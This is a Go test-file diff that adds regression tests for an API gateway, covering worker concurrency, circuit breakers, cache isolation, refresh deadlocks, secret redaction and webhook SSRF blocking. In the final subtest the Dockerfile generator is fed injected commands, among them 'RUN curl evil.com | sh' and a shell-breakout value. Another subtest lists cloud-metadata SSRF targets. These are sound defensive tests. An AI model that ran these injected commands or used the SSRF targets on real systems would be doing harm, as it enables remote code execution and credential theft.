@@ -1352,3 +1352,461 @@ func TestPrometheusMetricsExpositionAndDockerExport(t *testing.T) {
 		}
 	}
 }
+
+func TestProRegressionsAuditFixes(t *testing.T) {
+	// 1. Concurrent WorkerPool.AcquireHealthyEndpoint stress (zero divide-by-zero / races)
+	t.Run("AcquireHealthyEndpointConcurrentStress", func(t *testing.T) {
+		pool := NewWorkerPool("")
+		spec := ManagedWorkerSpec{
+			ID:        "wp-stress",
+			Name:      "Stress Workers",
+			Kind:      WorkerKindCustom,
+			Command:   "true",
+			BasePort:  41000,
+			Instances: 4,
+			Enabled:   true,
+		}
+		if _, err := pool.SaveSpec(spec); err != nil {
+			t.Fatalf("SaveSpec: %v", err)
+		}
+		// Reject negative Instances
+		badSpec := spec
+		badSpec.ID = "wp-neg"
+		badSpec.Instances = -2
+		if _, err := pool.SaveSpec(badSpec); err == nil {
+			t.Fatalf("expected error for negative Instances")
+		}
+
+		// Attach synthetic running/healthy runtime to stress AcquireHealthyEndpoint directly.
+		ctx, cancel := context.WithCancel(context.Background())
+		defer cancel()
+		rt := &workerRuntime{
+			spec:      spec,
+			ctx:       ctx,
+			cancel:    cancel,
+			instances: make([]*managedInstanceState, 4),
+		}
+		for i := range 4 {
+			rt.instances[i] = &managedInstanceState{
+				index:   i,
+				port:    41000 + i,
+				signURL: fmt.Sprintf("http://127.0.0.1:%d/sign", 41000+i),
+				running: true,
+				healthy: true,
+				stderr:  newTailBuffer(256),
+			}
+		}
+		pool.mu.Lock()
+		pool.runtimes[spec.ID] = rt
+		pool.mu.Unlock()
+
+		var wg sync.WaitGroup
+		for range 32 {
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+				for range 200 {
+					ep, rel, err := pool.AcquireHealthyEndpoint(spec.ID)
+					if err != nil || ep == "" {
+						t.Errorf("AcquireHealthyEndpoint failed: ep=%q err=%v", ep, err)
+						return
+					}
+					rel()
+				}
+			}()
+		}
+		wg.Wait()
+	})
+
+	// 2. Half-open circuit breaker pre-upstream failure must NOT permanently wedge circuit
+	t.Run("CircuitBreakerHalfOpenPreUpstreamAbortRecovers", func(t *testing.T) {
+		mgr, err := NewManager(t.TempDir())
+		if err != nil {
+			t.Fatalf("NewManager: %v", err)
+		}
+		defer func() { _ = mgr.Shutdown() }()
+
+		var clockMu sync.Mutex
+		curTime := time.Date(2026, 11, 25, 14, 0, 0, 0, time.UTC)
+		mgr.circuits.now = func() time.Time {
+			clockMu.Lock()
+			defer clockMu.Unlock()
+			return curTime
+		}
+
+		var failUpstream atomic.Bool
+		failUpstream.Store(true)
+		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			if failUpstream.Load() {
+				w.WriteHeader(http.StatusInternalServerError)
+				return
+			}
+			w.WriteHeader(http.StatusOK)
+			_, _ = w.Write([]byte(`{"recovered":true}`))
+		}))
+		defer upstream.Close()
+
+		_, err = mgr.SaveRoute(ServiceRoute{
+			Slug:                 "halfopen-abort",
+			Name:                 "HalfOpen Abort",
+			Enabled:              true,
+			UpstreamMethod:       "GET",
+			UpstreamURL:          upstream.URL + "/api",
+			CircuitFailThreshold: 1,
+			CircuitCooldownSec:   10,
+		})
+		if err != nil {
+			t.Fatalf("SaveRoute: %v", err)
+		}
+
+		// Trip circuit open
+		_, _ = mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{})
+		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateOpen || st.TripCount != 1 {
+			t.Fatalf("expected open circuit with tripCount=1, got %+v", st)
+		}
+
+		// Advance past cooldown, then invoke with a missing pinned DeviceID -> aborts BEFORE upstream!
+		clockMu.Lock()
+		curTime = curTime.Add(15 * time.Second)
+		clockMu.Unlock()
+
+		resAbort, invErr := mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{
+			DeviceID: "non-existent-device",
+		})
+		if invErr == nil || resAbort == nil || resAbort.CircuitTripped {
+			t.Fatalf("expected device acquisition error (not circuit trip), got err=%v res=%+v", invErr, resAbort)
+		}
+
+		// Circuit must NOT be wedged in half_open; OpenCount stays 1 and next valid request recovers!
+		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateOpen {
+			t.Fatalf("expected circuit reverted to open (not wedged half_open), got %+v", st)
+		}
+		if mgr.Stats().OpenCircuits != 1 {
+			t.Fatalf("expected OpenCircuits=1, got %d", mgr.Stats().OpenCircuits)
+		}
+
+		failUpstream.Store(false)
+		resOK, err := mgr.InvokeRoute(context.Background(), "halfopen-abort", TestInvokeRequest{})
+		if err != nil || !resOK.OK {
+			t.Fatalf("expected recovery after pre-upstream abort, got err=%v res=%+v", err, resOK)
+		}
+		if st := mgr.CircuitStates()["halfopen-abort"]; st.State != CircuitStateClosed {
+			t.Fatalf("expected circuit closed after recovery, got %+v", st)
+		}
+	})
+
+	// 3. RouteCache deep-clones res.Data + BuildCacheKey falls through JSON body to Headers
+	t.Run("RouteCacheDataIsolationAndJSONBodyHeaderKeyFallback", func(t *testing.T) {
+		mgr, err := NewManager(t.TempDir())
+		if err != nil {
+			t.Fatalf("NewManager: %v", err)
+		}
+		defer func() { _ = mgr.Shutdown() }()
+
+		var hits atomic.Int32
+		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			n := hits.Add(1)
+			w.Header().Set("Content-Type", "application/json")
+			_ = json.NewEncoder(w).Encode(map[string]any{
+				"tenant": r.Header.Get("X-Tenant"),
+				"hit":    n,
+				"nested": map[string]any{"items": []any{"a", "b"}},
+			})
+		}))
+		defer upstream.Close()
+
+		_, err = mgr.SaveRoute(ServiceRoute{
+			Slug:           "cache-isolation",
+			Name:           "Cache Isolation",
+			Enabled:        true,
+			UpstreamMethod: "POST",
+			UpstreamURL:    upstream.URL + "/items",
+			CacheTTLSec:    60,
+			CacheKeyFields: []string{"item", "X-Tenant"},
+		})
+		if err != nil {
+			t.Fatalf("SaveRoute: %v", err)
+		}
+
+		// Request 1 (tenant-a) -> MISS
+		res1, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
+			Body:    `{"item":"book"}`,
+			Headers: map[string]string{"X-Tenant": "tenant-a"},
+		})
+		if err != nil || res1.CacheHit {
+			t.Fatalf("expected MISS on res1: err=%v res=%+v", err, res1)
+		}
+		// Mutate res1.Data in-place; cache must remain unaffected!
+		m1 := res1.Data.(map[string]any)
+		m1["tenant"] = "CORRUPTED-BY-MISS-CALLER"
+		m1["nested"].(map[string]any)["items"].([]any)[0] = "MUTATED"
+
+		// Request 2 (tenant-a) -> HIT with pristine data
+		res2, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
+			Body:    `{"item":"book"}`,
+			Headers: map[string]string{"X-Tenant": "tenant-a"},
+		})
+		if err != nil || !res2.CacheHit {
+			t.Fatalf("expected HIT on res2: err=%v res=%+v", err, res2)
+		}
+		m2 := res2.Data.(map[string]any)
+		if m2["tenant"] != "tenant-a" || m2["nested"].(map[string]any)["items"].([]any)[0] != "a" {
+			t.Fatalf("cache data was mutated by previous caller: %+v", m2)
+		}
+		// Mutate res2.Data as well and verify a third HIT is still isolated
+		m2["tenant"] = "CORRUPTED-BY-HIT-CALLER"
+		res3, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
+			Body:    `{"item":"book"}`,
+			Headers: map[string]string{"X-Tenant": "tenant-a"},
+		})
+		if err != nil || !res3.CacheHit || res3.Data.(map[string]any)["tenant"] != "tenant-a" {
+			t.Fatalf("cache data was mutated by HIT caller: err=%v res=%+v", err, res3)
+		}
+
+		// Request 4 (same JSON body, DIFFERENT X-Tenant header) -> MUST MISS (proves header fallback works!)
+		res4, err := mgr.InvokeRoute(context.Background(), "cache-isolation", TestInvokeRequest{
+			Body:    `{"item":"book"}`,
+			Headers: map[string]string{"X-Tenant": "tenant-b"},
+		})
+		if err != nil || res4.CacheHit || hits.Load() != 2 {
+			t.Fatalf("expected separate cache key for X-Tenant=tenant-b with JSON body: err=%v hit=%v upstreamHits=%d",
+				err, res4.CacheHit, hits.Load())
+		}
+		if res4.Data.(map[string]any)["tenant"] != "tenant-b" {
+			t.Fatalf("unexpected tenant in res4: %+v", res4.Data)
+		}
+	})
+
+	// 4. Chained refresh routes with MaxRefreshAttempts=2 must NOT deadlock RefreshSingleflight
+	t.Run("ChainedRefreshNonDeadlockAndMarkHealthyClearsExpiry", func(t *testing.T) {
+		mgr, err := NewManager(t.TempDir())
+		if err != nil {
+			t.Fatalf("NewManager: %v", err)
+		}
+		defer func() { _ = mgr.Shutdown() }()
+
+		if err := mgr.UpdateAccountConfig(AccountPoolConfig{
+			Strategy: StrategyRoundRobin,
+			Refresh: AccountRefreshConfig{
+				MaxRefreshAttempts: 2,
+			},
+		}); err != nil {
+			t.Fatalf("UpdateAccountConfig: %v", err)
+		}
+
+		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			w.WriteHeader(http.StatusUnauthorized)
+			_, _ = w.Write([]byte(`{"error":"always unauthorized"}`))
+		}))
+		defer upstream.Close()
+
+		acc, err := mgr.SaveAccount(AccountProfile{
+			ID:        "acc-chain-1",
+			Name:      "Chain Account",
+			Token:     "chain-old-token",
+			Enabled:   true,
+			Status:    AccountStatusActive,
+			ExpiresAt: time.Now().UTC().Add(-5 * time.Minute).Format(time.RFC3339),
+		})
+		if err != nil {
+			t.Fatalf("SaveAccount: %v", err)
+		}
+		// MarkHealthy clears past ExpiresAt so healed account becomes acquirable
+		if err := mgr.AccountPool().MarkHealthy(acc.ID); err != nil {
+			t.Fatalf("MarkHealthy: %v", err)
+		}
+		if _, err := mgr.AccountPool().Acquire(AccountSelectOptions{ExplicitID: acc.ID}); err != nil {
+			t.Fatalf("expected healed account with cleared past ExpiresAt to be acquirable: %v", err)
+		}
+
+		_, _ = mgr.SaveRoute(ServiceRoute{
+			Slug:             "refresh-hop-2",
+			Name:             "Refresh Hop 2",
+			Enabled:          true,
+			UpstreamMethod:   "POST",
+			UpstreamURL:      upstream.URL + "/r2",
+			AutoRefresh:      true,
+			RefreshRouteSlug: "refresh-hop-1",
+		})
+		_, _ = mgr.SaveRoute(ServiceRoute{
+			Slug:             "refresh-hop-1",
+			Name:             "Refresh Hop 1",
+			Enabled:          true,
+			UpstreamMethod:   "POST",
+			UpstreamURL:      upstream.URL + "/r1",
+			AutoRefresh:      true,
+			RefreshRouteSlug: "refresh-hop-2",
+		})
+		_, _ = mgr.SaveRoute(ServiceRoute{
+			Slug:             "api-chained",
+			Name:             "API Chained",
+			Enabled:          true,
+			UpstreamMethod:   "GET",
+			UpstreamURL:      upstream.URL + "/api",
+			RequireAccount:   true,
+			AutoRefresh:      true,
+			RefreshRouteSlug: "refresh-hop-1",
+		})
+
+		done := make(chan struct{})
+		go func() {
+			defer close(done)
+			res, _ := mgr.InvokeRoute(context.Background(), "api-chained", TestInvokeRequest{AccountID: acc.ID})
+			if res == nil || res.Status != http.StatusUnauthorized {
+				t.Errorf("expected 401 response after chained refresh guard, got %+v", res)
+			}
+		}()
+
+		select {
+		case <-done:
+		case <-time.After(3 * time.Second):
+			t.Fatalf("chained refresh with MaxRefreshAttempts=2 deadlocked RefreshSingleflight!")
+		}
+	})
+
+	// 5. Account secret redaction in UpstreamURL/logs/webhooks + webhook redirect & trailing-dot SSRF blocking
+	t.Run("SecretRedactionInURLAndWebhookSSRFRedirectBlocking", func(t *testing.T) {
+		mgr, err := NewManager(t.TempDir())
+		if err != nil {
+			t.Fatalf("NewManager: %v", err)
+		}
+		defer func() { _ = mgr.Shutdown() }()
+
+		const (
+			tokSecret    = "SuperSecretTok_987654321"
+			csrfSecret   = "CsrfSecretVal_ABCDEF"
+			cookieSecret = "CookieSecretVal_XYZ123"
+		)
+
+		// Trailing-dot metadata host must be blocked
+		for _, bad := range []string{
+			"http://metadata.google.internal./computeMetadata/v1",
+			"http://metadata.goog./v1",
+			"http://169.254.169.254/latest/meta-data",
+			"http://0.0.0.0:8080/hook",
+		} {
+			if _, err := validateWebhookURL(bad); err == nil {
+				t.Fatalf("expected SSRF webhook URL %q to be blocked", bad)
+			}
+		}
+
+		// Redirect SSRF bounce must NOT be followed by sendChallengeWebhook
+		var redirectTargetHits atomic.Int32
+		redirectTarget := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			redirectTargetHits.Add(1)
+			w.WriteHeader(http.StatusOK)
+		}))
+		defer redirectTarget.Close()
+
+		redirector := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			http.Redirect(w, r, redirectTarget.URL+"/stolen", http.StatusFound)
+		}))
+		defer redirector.Close()
+
+		client, tr := newWebhookHTTPClient()
+		defer tr.CloseIdleConnections()
+		if err := sendChallengeWebhook(context.Background(), client, redirector.URL+"/hook", challengeWebhookPayload{
+			Event: "gateway.challenge_detected", RouteSlug: "test", Reason: "captcha",
+		}, nil); err != nil {
+			t.Fatalf("sendChallengeWebhook to redirector returned unexpected error: %v", err)
+		}
+		if redirectTargetHits.Load() != 0 {
+			t.Fatalf("webhook client followed redirect to %s (%d hits), want 0", redirectTarget.URL, redirectTargetHits.Load())
+		}
+
+		// Build a challenge body where tokSecret straddles byte 256!
+		straddleBody := strings.Repeat("x", 248) + tokSecret + " captcha_required " + cookieSecret
+		upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			w.WriteHeader(http.StatusForbidden)
+			_, _ = w.Write([]byte(straddleBody))
+		}))
+		defer upstream.Close()
+
+		hookCh := make(chan challengeWebhookPayload, 1)
+		hookSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			var p challengeWebhookPayload
+			_ = json.NewDecoder(r.Body).Decode(&p)
+			hookCh <- p
+			w.WriteHeader(http.StatusOK)
+		}))
+		defer hookSrv.Close()
+
+		acc, err := mgr.SaveAccount(AccountProfile{
+			ID:      "acc-redact-1",
+			Name:    "Redact User",
+			Token:   "Bearer " + tokSecret,
+			Cookie:  "sid=" + cookieSecret + "; flag=1",
+			Tokens:  map[string]string{"csrf": csrfSecret},
+			Enabled: true,
+			Status:  AccountStatusActive,
+		})
+		if err != nil {
+			t.Fatalf("SaveAccount: %v", err)
+		}
+
+		_, err = mgr.SaveRoute(ServiceRoute{
+			Slug:                "redact-url-route",
+			Name:                "Redact URL",
+			Enabled:             true,
+			UpstreamMethod:      "GET",
+			UpstreamURL:         upstream.URL + "/v1/{{account.token.csrf}}?tok={{account.token}}",
+			RequireAccount:      true,
+			ChallengeWebhookURL: hookSrv.URL + "/alert",
+		})
+		if err != nil {
+			t.Fatalf("SaveRoute: %v", err)
+		}
+
+		res, err := mgr.InvokeRoute(context.Background(), "redact-url-route", TestInvokeRequest{AccountID: acc.ID})
+		if err != nil {
+			t.Fatalf("InvokeRoute: %v", err)
+		}
+
+		// Verify UpstreamURL in TestInvokeResult AND InvocationRecord redacted ALL secrets
+		logs := mgr.ListLogs(5)
+		if len(logs) == 0 {
+			t.Fatalf("expected invocation log")
+		}
+		for _, field := range []string{res.UpstreamURL, logs[0].UpstreamURL} {
+			for _, secret := range []string{tokSecret, csrfSecret, cookieSecret} {
+				if strings.Contains(field, secret) {
+					t.Fatalf("secret %q leaked in URL field %q", secret, field)
+				}
+			}
+		}
+
+		// Verify webhook payload redacted UpstreamURL AND boundary-straddling secret in BodyPreview!
+		select {
+		case p := <-hookCh:
+			raw, _ := json.Marshal(p)
+			rawStr := string(raw)
+			for _, leaked := range []string{tokSecret, "SuperSecret", csrfSecret, cookieSecret} {
+				if strings.Contains(rawStr, leaked) {
+					t.Fatalf("secret substring %q leaked in challenge webhook payload: %s", leaked, rawStr)
+				}
+			}
+		case <-time.After(3 * time.Second):
+			t.Fatalf("timed out waiting for redacted challenge webhook")
+		}
+	})
+
+	// 6. GenerateDockerfile / GenerateDockerCompose malformed listenAddr sanitization
+	t.Run("DockerExportMalformedListenAddrSanitization", func(t *testing.T) {
+		for _, malicious := range []string{
+			"127.0.0.1:9090\nRUN curl evil.com | sh",
+			`:8080" && id #`,
+			":99999",
+			":0",
+			":notaport",
+		} {
+			df := GenerateDockerfile(malicious)
+			dc := GenerateDockerCompose(malicious)
+			if strings.Contains(df, "evil.com") || strings.Contains(df, "&& id") || !strings.Contains(df, "EXPOSE 9090\n") {
+				t.Fatalf("Dockerfile did not sanitize listenAddr %q:\n%s", malicious, df)
+			}
+			if strings.Contains(dc, "evil.com") || strings.Contains(dc, "&& id") || !strings.Contains(dc, `"9090:9090"`) {
+				t.Fatalf("DockerCompose did not sanitize listenAddr %q:\n%s", malicious, dc)
+			}
+		}
+	})
+}
